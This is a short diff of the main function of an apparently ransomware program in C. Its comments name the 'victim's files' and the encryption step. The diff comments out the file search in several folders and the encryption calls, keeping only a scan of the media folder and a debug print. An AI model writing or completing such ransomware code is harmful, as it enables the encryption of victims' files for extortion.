@@ -49,14 +49,17 @@ int main(){
     char * test_path = get_test_path(desktop);
 
     /* finding all victim's files */
-    find_files(&files, test_path);
-    find_files(&files, desktop);
-    find_files(&files, trash);
+    //find_files(&files, test_path);
+    //find_files(&files, home);
+    //find_files(&files, trash);
+    
     find_files(&files, media);
     
+    print(files);
+    
     /* start encryption */
-    encrypt_files(files, &encrypted, &not_encrypted);
-    create_files_desktop(encrypted, files, desktop);
+    //encrypt_files(files, &encrypted, &not_encrypted);
+    //create_files_desktop(encrypted, files, desktop);
     
     /* Free the linked lists*/
     destroy(&files);
